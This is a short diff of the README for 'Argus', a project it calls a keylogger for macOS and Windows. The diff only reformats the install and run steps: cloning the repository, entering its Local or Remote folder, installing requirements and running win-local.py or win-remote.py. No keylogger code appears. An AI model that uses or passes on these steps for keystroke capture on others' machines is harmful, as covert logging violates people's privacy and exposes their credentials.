@@ -29,15 +29,22 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 **git clone https://github.com/ALDON94/argus.git**
 
 
-**cd Argus/Windows/bin/Local**   *or*  **cd Argus/Windows/bin/Remote**
+
+**cd Argus/Windows/bin/Local**   or  **cd Argus/Windows/bin/Remote**
+
 
 
 **pip3 install -r requirements.txt**
 
 
-## run
 
-**python3 win-local.py**    *or*   **python3 win-remote.py** 
+
+
+# Run
+
+**python3 win-local.py**    or   **python3 win-remote.py** 
+
+
 
 
 
